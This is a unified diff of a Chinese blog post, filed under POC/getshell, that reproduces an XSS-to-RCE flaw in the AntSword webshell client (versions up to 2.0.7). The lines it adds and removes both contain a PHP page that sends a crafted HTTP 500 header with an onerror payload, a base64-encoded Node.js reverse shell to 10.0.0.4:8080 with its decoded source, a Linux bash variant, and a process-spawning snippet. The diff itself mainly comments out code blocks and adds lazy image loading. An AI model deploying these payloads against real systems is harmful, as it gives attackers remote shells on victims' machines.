@@ -7,21 +7,22 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="描述：2019年4月12日中国蚁剑被爆出存在xss，借此可以引起RCE。该漏洞是由于webshell在远程连接失败后，中国蚁剑会返回错误信息,且错误信息由html解析的从而导致xss漏洞 影响版本&amp;lt;=2.0.7参考：中国蚁剑被曝 XSS 漏洞，可导致远程命令执行 无需下载直接反弹shell-蚁剑XSS/RCE之window/linux环境 #本地复现实验环境：  win7 + 蚁剑2.0.7">
+<meta name="keywords" content="蚂剑getshell,xss,rce">
 <meta property="og:type" content="article">
 <meta property="og:title" content="中国蚁剑xss到rce之反弹shell">
 <meta property="og:url" content="https://brlove.github.io/p/3e60.html">
 <meta property="og:site_name" content="Brlove&#39;s Blog">
 <meta property="og:description" content="描述：2019年4月12日中国蚁剑被爆出存在xss，借此可以引起RCE。该漏洞是由于webshell在远程连接失败后，中国蚁剑会返回错误信息,且错误信息由html解析的从而导致xss漏洞 影响版本&amp;lt;=2.0.7参考：中国蚁剑被曝 XSS 漏洞，可导致远程命令执行 无需下载直接反弹shell-蚁剑XSS/RCE之window/linux环境 #本地复现实验环境：  win7 + 蚁剑2.0.7">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-0.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-3.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-1.png">
-<meta property="og:image" content="https://brlove.github.io/images/pasted-2.png">
-<meta property="og:updated_time" content="2019-04-19T16:12:11.490Z">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:image" content="https://brlove.github.io/images/loading.png">
+<meta property="og:updated_time" content="2019-06-20T09:18:55.693Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="中国蚁剑xss到rce之反弹shell">
 <meta name="twitter:description" content="描述：2019年4月12日中国蚁剑被爆出存在xss，借此可以引起RCE。该漏洞是由于webshell在远程连接失败后，中国蚁剑会返回错误信息,且错误信息由html解析的从而导致xss漏洞 影响版本&amp;lt;=2.0.7参考：中国蚁剑被曝 XSS 漏洞，可导致远程命令执行 无需下载直接反弹shell-蚁剑XSS/RCE之window/linux环境 #本地复现实验环境：  win7 + 蚁剑2.0.7">
-<meta name="twitter:image" content="https://brlove.github.io/images/pasted-0.png">
+<meta name="twitter:image" content="https://brlove.github.io/images/loading.png">
     
     
         
@@ -141,9 +142,21 @@
 
 
       
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="../categories/poc/">POC</a> › <a class="category-link" href="../categories/poc/getshell/">getshell</a>
+    </div>
+
 
       
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="../tags/rce/">rce</a>, <a class="tag-link" href="../tags/xss/">xss</a>, <a class="tag-link" href="../tags/蚂剑getshell/">蚂剑getshell</a>
+    </div>
 
+
+<!-- 字数统计 -->
+      <div style="text-align:end;">本篇文章 <span class="post-count" style="color:green">382</span> 字</div>
     </div>
   </header>
   
@@ -160,38 +173,43 @@
 </ul>
 </blockquote>
 <h3 id="一、先简单弹出一个xss"><a href="#一、先简单弹出一个xss" class="headerlink" title="一、先简单弹出一个xss"></a>一、先简单弹出一个xss</h3><p>1.在phpstudy下新建shell.php</p>
-<pre class="line-numbers"><code class="language-php">
-&#60;?php
-    header('HTTP/1.1 500 Not &#60;img src=# onerror=aler&#116;(123)&#62;')
-?&#62;
-</code></pre>
+<pre class="line-numbers"><code class="language-php"><!--
+
+    <?php
+        header('HTTP/1.1 500 Not <img src=# onerror=aler&#116;(123)>')
+    ?>
+--></code></pre>
 
 <p>2.在蚁剑添加一条shell数据</p>
-<p><img src="/images/pasted-0.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-0.png" alt="upload successful"></p>
 <p>3.双击访问shell即弹出了xss代码</p>
-<p><img src="/images/pasted-3.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-3.png" alt="upload successful"></p>
 <h3 id="二、反弹windows的cmd-shell"><a href="#二、反弹windows的cmd-shell" class="headerlink" title="二、反弹windows的cmd_shell"></a>二、反弹windows的cmd_shell</h3><p>1.修改phpstudy站点下的shell.php代码如下（base64解码修改为自己的服务ip和端口，然后重新base64编码即可，切记不要进行url编码）</p>
-<pre class="line-numbers"><code class="language-php">
-&#60;?php
-header("HTTP/1.1 500 Not &#60;img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg4MDgwLCAiMTAuMC4wLjQiLCBmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpOwpzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOw==`,`base64`).toString())'&#62;");
-?&#62;
-</code></pre>
+<pre class="line-numbers"><code class="language-php"><!--
+
+    <?php
+        header("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg4MDgwLCAiMTAuMC4wLjQiLCBmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpOwpzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOw==`,`base64`).toString())'>");
+    ?>
+
+--></code></pre>
 
 <p>windows下反弹shell的源码base64解码如下：</p>
 <pre class="line-numbers"><code class="language-php">
-var net = require("net"), sh = require("child_process").exec("cmd.exe");
-var client = new net.Socket();
-client.connect(8080, "10.0.0.4", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
-sh.stderr.pipe(client);});
+
+    var net = require("net"), sh = require("child_process").exec("cmd.exe");
+    var client = new net.Socket();
+    client.connect(8080, "10.0.0.4", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+    sh.stderr.pipe(client);});
 
 </code></pre>
 
 <p>2.nc监听8080端口</p>
-<p><img src="/images/pasted-1.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-1.png" alt="upload successful"></p>
 <p>3.然后在蚁剑下点击该webshell，即可成功反弹cmd-shell</p>
-<p><img src="/images/pasted-2.png" alt="upload successful"></p>
+<p><img src="/images/loading.png" data-original="/images/pasted-2.png" alt="upload successful"></p>
 <h3 id="三、其他补充"><a href="#三、其他补充" class="headerlink" title="三、其他补充"></a>三、其他补充</h3><p>同理可以windows下直接执行CMD命令或者在Linux下利用nodejs反弹shell。 如果windows环境下执行CMD对应base64编码的部分源码如下：</p>
-<pre class="line-numbers"><code class="language-php">
+<pre class="line-numbers"><code class="language-php"><!--
+
 var Process = window.parent.top.process.binding('process_wrap').Process;
 var proc = new Process();
 proc.onexit = function (a, b) {};
@@ -214,10 +232,11 @@ proc.spawn({
     }]
 });
 
-</code></pre>
+--></code></pre>
 
 <p>linux的源码如下：</p>
 <pre class="line-numbers"><code class="language-php">
+
 var net = require("net"), sh = require("child_process").exec("/bin/bash");
 var client = new net.Socket();
 client.connect(8080, "10.0.0.4", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
@@ -227,6 +246,8 @@ sh.stderr.pipe(client);});
 
 
 <h3 id="侵删"><a href="#侵删" class="headerlink" title="侵删"></a>侵删</h3>
+<!-- 时长 -->
+    <div style="margin-top:100px; text-align:end; margin-bottom:50px;">你已阅读 <span class="post-count" style="color:green">1</span> 分钟</div>
   </div>
 </article>
 
@@ -320,5 +341,5 @@ sh.stderr.pipe(client);});
 <!-- Disqus Comments -->
 
 
-</body>
+<script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
 </html>
